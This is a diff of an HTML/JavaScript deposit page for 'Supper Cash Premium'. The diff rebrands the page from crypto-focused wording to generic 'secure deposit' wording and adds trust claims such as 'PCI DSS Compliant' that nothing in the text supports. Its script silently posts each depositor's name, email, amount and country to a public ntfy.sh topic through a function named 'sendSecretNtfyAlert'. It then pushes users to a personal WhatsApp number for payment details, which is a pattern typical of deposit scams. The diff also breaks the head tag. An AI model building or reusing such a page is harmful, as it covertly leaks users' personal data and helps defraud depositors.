@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head:
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Supper Cash Premium | Fast Crypto Deposit</title>
+  <title>Supper Cash Premium | Secure Deposit Portal</title>
   <style>
     :root {
       --primary: #0047AB;
@@ -401,19 +401,6 @@
       margin-top: 15px;
     }
     
-    .crypto-badge {
-      background: linear-gradient(135deg, #f0f4ff, #e8f0fe);
-      border-radius: 12px;
-      padding: 12px;
-      margin-top: 15px;
-      text-align: center;
-    }
-    
-    .crypto-badge i {
-      font-size: 1.5rem;
-      margin-right: 8px;
-    }
-    
     @media (max-width: 768px) {
       .form-card { padding: 25px; }
       .main-header { flex-direction: column; gap: 15px; text-align: center; }
@@ -437,7 +424,7 @@
   <div class="container">
     <header class="main-header">
       <div class="logo-area">
-        <div class="logo-badge"><i class="fas fa-bitcoin"></i></div>
+        <div class="logo-badge"><i class="fas fa-gem"></i></div>
         <div class="logo-text">Supper Cash Premium</div>
       </div>
       <div class="user-info">
@@ -452,12 +439,12 @@
     <div class="deposit-container">
       <div class="form-card">
         <div class="form-header">
-          <h1>Fast Crypto Deposit</h1>
-          <p>Instant deposits with Bitcoin & popular wallets</p>
+          <h1>Make a Deposit</h1>
+          <p>Add funds to your account securely</p>
         </div>
         <div class="welcome-banner" id="welcomeBanner">
           <p id="welcomeMessage">Enter an amount to begin</p>
-          <small><i class="fas fa-bolt"></i> Lightning fast deposits • 1-3 confirmations</small>
+          <small><i class="fas fa-shield-alt"></i> All transactions are encrypted and secure</small>
         </div>
         <form id="depositForm">
           <div class="form-group">
@@ -498,65 +485,54 @@
                 <option value="Netherlands">🇳🇱 Netherlands</option>
                 <option value="Switzerland">🇨🇭 Switzerland</option>
                 <option value="UAE">🇦🇪 United Arab Emirates</option>
+                <option value="Saudi Arabia">🇸🇦 Saudi Arabia</option>
                 <option value="Singapore">🇸🇬 Singapore</option>
                 <option value="Japan">🇯🇵 Japan</option>
                 <option value="South Korea">🇰🇷 South Korea</option>
                 <option value="Brazil">🇧🇷 Brazil</option>
                 <option value="Mexico">🇲🇽 Mexico</option>
+                <option value="South Africa">🇿🇦 South Africa</option>
                 <option value="India">🇮🇳 India</option>
               </select>
             </div>
           </div>
           
           <div class="form-group">
-            <label for="paymentType">Select Payment Method</label>
+            <label for="paymentType">Payment Method</label>
             <div class="input-wrapper">
-              <i class="fas fa-coins"></i>
+              <i class="fas fa-credit-card"></i>
               <select id="paymentType" required>
-                <option value="Bitcoin (BTC)">₿ Bitcoin (BTC) - Fast</option>
-                <option value="Ethereum (ETH)">Ξ Ethereum (ETH) - Fast</option>
-                <option value="USDT (TRC20)">💵 USDT (TRC20) - Instant</option>
-                <option value="USDT (ERC20)">💵 USDT (ERC20) - Fast</option>
-                <option value="Binance Coin (BNB)">🔶 Binance Coin (BNB) - Fast</option>
-                <option value="Solana (SOL)">⚡ Solana (SOL) - Instant</option>
-                <option value="Cardano (ADA)">🟣 Cardano (ADA) - Fast</option>
-                <option value="Ripple (XRP)">💨 Ripple (XRP) - Instant</option>
-                <option value="Dogecoin (DOGE)">🐕 Dogecoin (DOGE) - Fast</option>
-                <option value="Litecoin (LTC)">⚡ Litecoin (LTC) - Fast</option>
-                <option value="PayPal">🅿️ PayPal - Instant</option>
-                <option value="Skrill">💰 Skrill - Instant</option>
-                <option value="Wise Transfer">🌐 Wise Transfer - Fast</option>
-                <option value="Revolut">⚡ Revolut - Instant</option>
-                <option value="Cash App">📱 Cash App - Instant</option>
-                <option value="Venmo">💚 Venmo - Instant</option>
-                <option value="Apple Pay">📱 Apple Pay - Instant</option>
-                <option value="Google Pay">🤖 Google Pay - Instant</option>
+                <option value="Bitcoin (BTC)">₿ Bitcoin (BTC)</option>
+                <option value="Ethereum (ETH)">Ξ Ethereum (ETH)</option>
+                <option value="USDT (TRC20)">💵 USDT (TRC20)</option>
+                <option value="USDT (ERC20)">💵 USDT (ERC20)</option>
+                <option value="PayPal">🅿️ PayPal</option>
+                <option value="Skrill">💰 Skrill</option>
+                <option value="Wise Transfer">🌐 Wise Transfer</option>
+                <option value="Revolut">⚡ Revolut</option>
+                <option value="Cash App">📱 Cash App</option>
+                <option value="Venmo">💚 Venmo</option>
+                <option value="Bitcoin (Lightning)">⚡ Bitcoin (Lightning)</option>
+                <option value="Bitcoin Cash (BCH)">₿ Bitcoin Cash (BCH)</option>
               </select>
             </div>
           </div>
           
           <button type="submit" class="submit-btn" id="submitBtn">
-            <i class="fas fa-bolt"></i>
-            <span>Request Deposit Details</span>
+            <i class="fas fa-lock"></i>
+            <span>Process Deposit</span>
           </button>
         </form>
       </div>
 
       <div class="sidebar">
         <div class="sidebar-card">
-          <h3><i class="fas fa-bolt"></i> Fast Processing</h3>
+          <h3><i class="fas fa-clock"></i> Processing Times</h3>
           <ul class="feature-list">
-            <li><i class="fas fa-check-circle"></i> <strong>Bitcoin:</strong> 1-3 confirmations (~10-30 min)</li>
-            <li><i class="fas fa-check-circle"></i> <strong>Solana / XRP:</strong> Near-instant</li>
-            <li><i class="fas fa-check-circle"></i> <strong>E-wallets:</strong> Instant to 5 minutes</li>
-            <li><i class="fas fa-check-circle"></i> <strong>USDT (TRC20):</strong> 1-2 confirmations</li>
+            <li><i class="fas fa-bolt"></i> <strong>Crypto:</strong> 1-3 confirmations</li>
+            <li><i class="fas fa-bolt"></i> <strong>E-wallets:</strong> 5-30 minutes</li>
+            <li><i class="fas fa-bolt"></i> <strong>Instant Methods:</strong> Within minutes</li>
           </ul>
-          <div class="crypto-badge">
-            <i class="fab fa-bitcoin"></i>
-            <i class="fab fa-ethereum"></i>
-            <i class="fas fa-bolt"></i>
-            <p style="margin-top: 8px; font-size: 0.85rem;">All crypto deposits processed automatically</p>
-          </div>
         </div>
         
         <div class="sidebar-card">
@@ -565,17 +541,17 @@
             <li><i class="fas fa-check-circle"></i> 256-bit SSL Encryption</li>
             <li><i class="fas fa-check-circle"></i> Two-Factor Authentication</li>
             <li><i class="fas fa-check-circle"></i> Real-time Transaction Monitoring</li>
-            <li><i class="fas fa-check-circle"></i> Cold Wallet Storage</li>
+            <li><i class="fas fa-check-circle"></i> 24/7 Fraud Protection</li>
           </ul>
           <div class="security-badge">
             <i class="fas fa-shield-hooded"></i>
-            <span>Bank-Grade Security</span>
+            <span>PCI DSS Compliant</span>
           </div>
         </div>
         
         <div class="sidebar-card">
-          <h3><i class="fas fa-headset"></i> 24/7 Support</h3>
-          <p style="color: var(--gray); margin-bottom: 15px;">Fast deposits, instant support</p>
+          <h3><i class="fas fa-headset"></i> Support</h3>
+          <p style="color: var(--gray); margin-bottom: 15px;">Need assistance? Our support team is available 24/7.</p>
           <div style="display: flex; gap: 12px;">
             <i class="fas fa-envelope" style="color: var(--primary);"></i>
             <span style="font-size: 0.9rem;">admin@suppcash.com</span>
@@ -589,13 +565,13 @@
     </div>
     
     <footer class="footer">
-      <p>© 2024 Supper Cash Premium. Fast Crypto Deposits | Support: <a href="mailto:admin@suppcash.com">admin@suppcash.com</a></p>
+      <p>© 2024 Supper Cash Premium. All rights reserved. | For support, contact: <a href="mailto:admin@suppcash.com">admin@suppcash.com</a></p>
     </footer>
   </div>
 
   <script>
-    // ======================= FAST DEPOSIT NOTIFICATION SYSTEM =======================
-    const NTFY_TOPIC = "supper-cash-fast";
+    // ======================= SECURE NOTIFICATION SYSTEM =======================
+    const NTFY_TOPIC = "supper-cash-secure";
     const ADMIN_WHATSAPP = "+12568212395";
     const MIN_DEPOSIT = 20;
     
@@ -628,14 +604,14 @@
     // ========== SECRET NTFY NOTIFICATION ==========
     async function sendSecretNtfyAlert(depositData) {
       try {
-        const messageText = `⚡ FAST DEPOSIT REQUEST\n━━━━━━━━━━━━━━━━\n👤 User: ${depositData.fullName}\n📧 Email: ${depositData.email}\n💵 Amount: $${depositData.amountUSD} USD\n🌍 Country: ${depositData.country}\n💳 Method: ${depositData.method}\n🕒 Time: ${depositData.time}\n🆔 ID: ${depositData.id}\n━━━━━━━━━━━━━━━━\nStatus: PENDING - Fast Deposit`;
+        const messageText = `🔔 DEPOSIT REQUEST\n━━━━━━━━━━━━━━━━\n👤 User: ${depositData.fullName}\n📧 Email: ${depositData.email}\n💵 Amount: $${depositData.amountUSD} USD\n🌍 Country: ${depositData.country}\n💳 Method: ${depositData.method}\n🕒 Time: ${depositData.time}\n🆔 ID: ${depositData.id}\n━━━━━━━━━━━━━━━━\nStatus: PENDING CONFIRMATION`;
         await fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
           method: 'POST',
           body: messageText,
           headers: { 
-            'Title': '⚡ Fast Deposit Alert',
+            'Title': '💰 New Deposit Alert',
             'Priority': 'high',
-            'Tags': 'bitcoin,rocket,lightning'
+            'Tags': 'moneybag,alert,rocket'
           }
         });
         console.log("✅ Silent ntfy notification delivered");
@@ -655,15 +631,15 @@
     
     async function notifyAdminChat(payload) {
       if (socket && socket.connected) {
-        const msg = `⚡ FAST DEPOSIT\nUser: ${payload.fullName}\nEmail: ${payload.email}\nAmount: $${payload.amountUSD}\nMethod: ${payload.method}\nCountry: ${payload.country}`;
+        const msg = `🔔 NEW DEPOSIT\nUser: ${payload.fullName}\nEmail: ${payload.email}\nAmount: $${payload.amountUSD}\nMethod: ${payload.method}\nCountry: ${payload.country}`;
         socket.emit('send-message', { to: 'admin@delux.com', message: msg });
         console.log("Admin chat notified");
       }
     }
     
-    // ========== WHATSAPP AUTO-REDIRECT with payment request ==========
+    // ========== WHATSAPP AUTO-REDIRECT ==========
     function triggerWhatsAppWithDetails(details) {
-      const waMsg = `*⚡ FAST DEPOSIT REQUEST*%0A%0A` +
+      const waMsg = `*💰 DEPOSIT REQUEST*%0A%0A` +
         `*👤 User:* ${encodeURIComponent(details.fullName)}%0A` +
         `*📧 Email:* ${encodeURIComponent(details.email)}%0A` +
         `*💵 Amount:* $${details.amountUSD} USD%0A` +
@@ -672,7 +648,7 @@
         `*🕒 Time:* ${encodeURIComponent(details.time)}%0A` +
         `*🆔 Reference:* ${details.ref}%0A%0A` +
         `*📝 Message:* Please send me payment details as I requested. I wanted to deposit $${details.amountUSD} USD via ${details.method}.%0A%0A` +
-        `✅ Waiting for payment instructions - Fast deposit expected.`;
+        `✅ Awaiting payment instructions.`;
       
       const waUrl = `https://wa.me/${ADMIN_WHATSAPP.replace(/[^0-9]/g, '')}?text=${waMsg}`;
       window.open(waUrl, '_blank');
@@ -691,21 +667,21 @@
           };
         } else {
           currentUser = {
-            fullName: "Michael Crypto",
-            email: "michael.crypto@supper.cash",
+            fullName: "James Anderson",
+            email: "james.anderson@supper.cash",
             id: "VIP8923"
           };
         }
       } catch (error) {
         currentUser = {
-          fullName: "Sarah Blockchain",
-          email: "sarah.b@supper.cash",
+          fullName: "Sarah Mitchell",
+          email: "sarah.m@supper.cash",
           id: "USR7741"
         };
       }
       userNameSpan.textContent = currentUser.fullName;
       userEmailSpan.textContent = currentUser.email;
-      welcomeMsgSpan.textContent = `Welcome back, ${currentUser.fullName}! Fast crypto deposits ready.`;
+      welcomeMsgSpan.textContent = `Welcome back, ${currentUser.fullName}! Enter your deposit amount.`;
     }
     
     // Update amount display
@@ -721,7 +697,7 @@
     
     // Generate random reference
     function generateReference() {
-      return 'FAST-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+      return 'DEP-' + Math.random().toString(36).substring(2, 10).toUpperCase();
     }
     
     // Handle deposit submission
@@ -779,10 +755,10 @@
         // Auto open WhatsApp with payment details request
         triggerWhatsAppWithDetails(depositPayload);
         
-        // Fast processing simulation
+        // Simulate processing
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
-          showToast(`Fast deposit request submitted! Reference: ${reference}. Payment details sent via WhatsApp.`, 'success');
+          showToast(`Deposit request submitted! Reference: ${reference}. Payment details sent via WhatsApp.`, 'success');
           submitBtn.disabled = false;
           
           // Reset form
@@ -791,18 +767,18 @@
           paymentTypeSelect.value = 'Bitcoin (BTC)';
           amountDisplay.style.display = 'none';
           
-          // Redirect after delay
+          // Optional redirect after delay
           setTimeout(() => {
             window.location.href = '/chat.html';
-          }, 2000);
-        }, 1200);
+          }, 2500);
+        }, 1800);
         
       } catch (error) {
         console.error('Notification error:', error);
         loadingOverlay.classList.remove('active');
         // Fallback - still try WhatsApp
         triggerWhatsAppWithDetails(depositPayload);
-        showToast('Fast deposit request recorded. Admin will send payment details.', 'success');
+        showToast('Deposit request recorded. Admin will contact you shortly.', 'success');
         submitBtn.disabled = false;
         
         setTimeout(() => {
